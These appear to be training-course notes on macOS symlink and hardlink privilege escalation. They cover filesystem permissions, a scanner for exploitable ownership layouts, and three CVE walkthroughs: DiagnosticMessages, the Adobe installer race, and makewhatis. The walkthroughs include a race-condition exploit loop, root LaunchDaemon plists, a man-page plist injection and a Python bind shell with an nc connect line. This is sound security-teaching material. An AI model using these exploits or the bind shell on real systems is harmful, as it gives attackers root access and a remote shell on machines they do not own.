# Module 10: Symlink and Hardlink Attacks

## Filesystem Permission Model

### POSIX Permissions

Standard owner/group/world with read/write/execute. Directory-specific behaviors:
- **read:** enumerate directory entries
- **write:** delete and create files in the directory
- **execute:** traverse directory (access files within it)

Key scenarios:
- Execute but no read: can access files by name, cannot list directory
- Read but no execute: can list files, cannot access their content
- Write on directory + root-owned files: can delete root-owned files (unless sticky bit)

```bash
chmod u=rwx,g=rwx,o=rwx file.txt    # Grant full access
chmod u=rw,g=rw,o=rw directory/     # Revoke execute on directory
```

### Flag Modifiers

```bash
ls -lO /                             # List flags
chflags uchg file.txt                # Set immutable flag
```

| Flag | Effect |
|------|--------|
| `uchg`/`uimmutable` | Cannot be changed, even by root (root can remove flag) |
| `restricted` | SIP-protected, cannot be modified even by root |
| `sunlnk` | Restricted deletion |
| `hidden` | Hidden from Finder |

### Sticky Bit

When set on a directory, only the file owner, directory owner, or root can rename/delete files within it. Typically set on `/tmp/`.

### Access Control Lists (ACLs)

```bash
ls -le ~/Library                     # List ACL entries
```

Granular permissions beyond POSIX: `list`, `search`, `add_file`, `add_subdirectory`, `delete_child`, `read`, `write`, `append`, `execute`.

### Sandbox Filesystem Restrictions

Sandbox profiles in `/usr/share/sandbox/` and `/System/Library/Sandbox/Profiles/` further restrict file access even for root processes. Example: mds process has `(deny default)` with explicit `(allow file-write*)` only to Spotlight-related directories.

## Finding Bugs

### Static Analysis

Search for two exploitable scenarios:
1. File owner is root, directory owner is non-root (user can delete/replace file)
2. File owner is root, user's group has write access to directory

**Python scanner:**
```python
import os, stat

admin_groups = [20, 80, 501, 12, 61, 79, 81, 98, 701, 702, 703, 33, 100, 204, 250, 395, 398, 399]

for root, dirs, files in os.walk("/", topdown=True):
    for f in files:
        full_path = os.path.join(root, f)
        directory = os.path.dirname(full_path)
        try:
            # Scenario 1: root-owned file in non-root directory
            if os.stat(full_path).st_uid == 0 and os.stat(directory).st_uid != 0:
                print(f"[+] Issue: {full_path}, dir owner: {os.stat(directory).st_uid}")
            # Scenario 2: root-owned file, admin group has write on directory
            if (os.stat(full_path).st_uid == 0 and
                os.stat(directory).st_gid in admin_groups and
                os.stat(directory).st_mode & stat.S_IWGRP):
                print(f"[+] Issue: {full_path}, group write: {os.stat(directory).st_gid}")
        except:
            continue
```

### Dynamic Analysis

Monitor file operations in real-time using:
- **FileMonitor** (Objective-See) - uses Endpoint Security framework, outputs JSON
- **fs_usage** - built-in file system activity monitor
- **DTrace** - system tracing

```bash
sudo FileMonitor -pretty    # Human-readable output with process, uid, signature info
```

### Exploitable Conditions

General attack: delete target file, replace with symlink/hardlink pointing to protected location.

Potential blockers:
1. Process may be sandboxed (can't write to interesting locations)
2. Process may not follow symlinks/hardlinks (overwrites link, creates new file)
3. Resulting file still owned by root (can't modify contents)

## CVE-2020-3855: DiagnosticMessages File Overwrite

**Discovery:** `/private/var/log/DiagnosticMessages/` is writable by admin group, but files are owned by root.

```bash
ls -l /private/var/log/ | grep Diag
# drwxrwx---  7 root  admin  224  DiagnosticMessages

ls -l /private/var/log/DiagnosticMessages
# -rw-r--r--@ 1 root  admin  83269 2020.10.20.asl
```

**Exploitation with hardlinks:**
```bash
# Create empty target file
sudo touch /Library/a.asl

# Replace log file with hardlink (symlinks not followed here)
cd /private/var/log/DiagnosticMessages
rm 2020.10.28.asl
ln /Library/a.asl 2020.10.28.asl

# Reboot, wait for logs to populate
# Verify redirection
ls -l /Library/a.asl    # Shows same content as log file
```

**ASL log injection:** The ASL files accept messages via the undocumented `msgtracer` API, wrapped by `CalMessageTracer` class in CalendarFoundation framework.

```objc
#import <dlfcn.h>
#import <Foundation/Foundation.h>
#import "CalMessageTracer.h"

int main(int argc, const char * argv[]) {
    @autoreleasepool {
        void* tracer = dlopen(
            "/System/Library/PrivateFrameworks/CalendarFoundation.framework/"
            "Versions/Current/CalendarFoundation", RTLD_LAZY);
        Class CalMessageTracerCl = NSClassFromString(@"CalMessageTracer");
        [CalMessageTracerCl log:@"hello from offsec"
            domain:@"com.apple.sleepservices.icalData"
            signature:@"CalDAV account refresh statistics" result:0x0];
    }
    return 0;
}
```

## CVE-2020-3762: Adobe Reader Installer Privilege Escalation

**Root cause:** Adobe installer places PLIST files in `/tmp/` (fixed path), then copies them to `/Library/LaunchDaemons/`. The `/tmp/` directory has the sticky bit, but subdirectories do not.

**Attack:** Race condition to pre-create the directory structure and replace the PLIST before it's copied to LaunchDaemons.

**Race condition exploit:**
```python
import os, shutil

while(1):
    try:
        os.system('mkdir -p "/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat '
                   'Updater.app/Contents/Library/LaunchServices"')
        path = ("/tmp/com.adobe.AcrobatRefreshManager/Adobe Acrobat "
                "Updater.app/Contents/Library/LaunchServices/SMJobBlessHelper-Launchd.plist")
        if os.stat(path).st_uid == 0:
            os.remove(path)
        shutil.copy2('/Users/Shared/com.adobe.exploit.plist', path)
    except:
        continue
```

**Malicious PLIST (runs as root via LaunchDaemons):**
```xml
<plist version="1.0"><dict>
    <key>Label</key><string>com.adobe.ARMDC.SMJobBlessHelper</string>
    <key>ProgramArguments</key><array>
        <string>/bin/bash</string><string>-c</string>
        <string>touch /Library/adobeexp.txt</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict></plist>
```

## CVE-2019-8802: Manpages Privilege Escalation

**Root cause:** Weekly periodic script (`/etc/periodic/weekly/320.whatis`) runs `makewhatis.local` on manpage paths. With Homebrew installed, `/usr/local/share/man/` is user-writable.

**Attack chain:**
1. `makewhatis` creates `whatis.tmp` in the manpage path
2. Create symlink: `ln -s /Library/LaunchDaemons/com.sample.Load.plist /usr/local/share/man/whatis.tmp`
3. Embed valid XML PLIST in a man page's NAME section
4. Handle XML validity with comment tricks in the filename

**Man page filename trick:**
```bash
# Rename to start with XML comment opener (sorts first, valid filename)
mv /usr/local/share/man/man1/7z.1 /usr/local/share/man/man1/\<\!--7z.1
```

**Man page NAME section with embedded PLIST:**
```
.SH NAME
7z - --><?xml version="1.0" encoding="UTF-8"?><!DOCTYPE plist PUBLIC ...><plist version="1.0"><dict><key>Label</key><string>com.sample.Load</string><key>ProgramArguments</key><array><string>/Applications/Scripts/sample.sh</string></array><key>RunAtLoad</key><true/></dict></plist><!--
```

**Trigger and verify:**
```bash
sudo periodic weekly                  # Run weekly scripts
cat /Library/LaunchDaemons/com.sample.Load.plist  # Verify PLIST created
```

**Bind shell script (runs as root after reboot):**
```python
#!/usr/bin/python2
import os, pty, socket
lport = 31337
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(('', lport))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
if __name__ == "__main__":
    main()
```

```bash
nc 192.168.51.110 31337    # Connect after reboot for root shell
```
